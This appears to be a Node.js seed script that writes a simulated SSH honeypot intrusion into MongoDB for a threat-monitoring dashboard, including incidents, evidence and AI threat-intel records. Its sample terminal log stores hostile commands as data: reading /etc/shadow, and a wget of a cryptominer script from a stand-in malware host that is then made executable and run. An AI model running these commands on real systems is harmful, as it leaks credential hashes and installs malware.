require('dotenv').config();
const mongoose = require('mongoose');
const Incident = require('./models/Incident');
const AttackerSession = require('./models/AttackerSession');
const TerminalLog = require('./models/TerminalLog');
const AiThreatIntel = require('./models/AiThreatIntel');
const Honeypot = require('./models/Honeypot');
const Evidence = require('./models/Evidence');

const dns = require('dns');
dns.setServers(['8.8.8.8', '8.8.4.4']);

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function simulateJourney() {
  await mongoose.connect(process.env.MONGO_URI);
  console.log("Connected to MongoDB for comprehensive simulation.");

  const sessionId = `sess_${Math.random().toString(36).substr(2, 9)}`;
  const attackerIp = `103.${Math.floor(Math.random() * 255)}.44.${Math.floor(Math.random() * 255)}`;
  
  console.log(`[+] Starting Attacker Journey: ${sessionId} from ${attackerIp}`);

  // 0. Ensure a Honeypot exists
  let honeypot = await Honeypot.findOne({ name: 'SSH_Gateway_01' });
  if (!honeypot) {
    honeypot = await Honeypot.create({
      name: 'SSH_Gateway_01',
      type: 'SSH',
      ip: '10.0.0.45',
      port: 22,
      status: 'Running'
    });
    console.log('[+] Created Honeypot: SSH_Gateway_01');
  }

  // 1. Create Session (Recon)
  const session = await AttackerSession.create({
    sessionId,
    attackerIp,
    targetHoneypot: 'SSH_Gateway_01',
    currentPhase: 'recon',
    aiSummary: 'Attacker is probing for open ports.'
  });

  await Incident.create({
    type: 'Port Scan',
    ip: attackerIp,
    target: 'SSH_Gateway_01',
    severity: 'Low'
  });

  await wait(2000);
  
  // 2. Escalation (Exploitation)
  session.currentPhase = 'exploitation';
  session.activeTactics.push({ name: 'Tarpitting', description: 'Slowing down connection' });
  session.aiSummary = 'Brute force credentials successful. Gaining shell access.';
  session.filesAccessed = [
    { path: '/etc/shadow', type: 'file' },
    { path: '/tmp/miner.sh', type: 'script' }
  ];
  await session.save();

  await Incident.create({
    type: 'Brute Force',
    ip: attackerIp,
    target: 'SSH_Gateway_01',
    severity: 'High'
  });

  // 3. Terminal typing & Evidence Collection
  const commands = [
    { cmd: 'whoami', res: 'root' },
    { cmd: 'cat /etc/shadow', res: 'root:$6$....' },
    { cmd: 'wget http://malware.com/miner.sh -O /tmp/miner.sh', res: 'Saving to: /tmp/miner.sh' },
    { cmd: 'chmod +x /tmp/miner.sh', res: '' },
    { cmd: './tmp/miner.sh', res: 'Starting CPU mining...' }
  ];

  for (let c of commands) {
    await wait(2000);
    await TerminalLog.create({
      sessionId: session.sessionId,
      command: c.cmd,
      response: c.res
    });
    console.log(`[Terminal] ${c.cmd}`);
  }

  // Create Evidence from the downloaded malware
  await Evidence.create({
    incidentId: session.sessionId,
    name: 'miner.sh',
    type: 'Malware/Script',
    hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    size: '1.4 KB',
    status: 'Analyzed'
  });
  console.log('[+] Captured Malware Evidence');

  // 4. Generate AI Threat Intel
  await AiThreatIntel.create({
    classification: 'Cryptominer Dropper',
    confidence: 98,
    mitreId: 'T1105',
    mitreName: 'Ingress Tool Transfer',
    severity: 'Critical',
    pattern: 'Attacker downloaded a script via wget and executed it directly.',
    recommendation: 'Block outbound traffic to known miner IPs on port 80/443.'
  });

  console.log(`[+] Journey Complete: ${sessionId}`);
  process.exit(0);
}

simulateJourney();
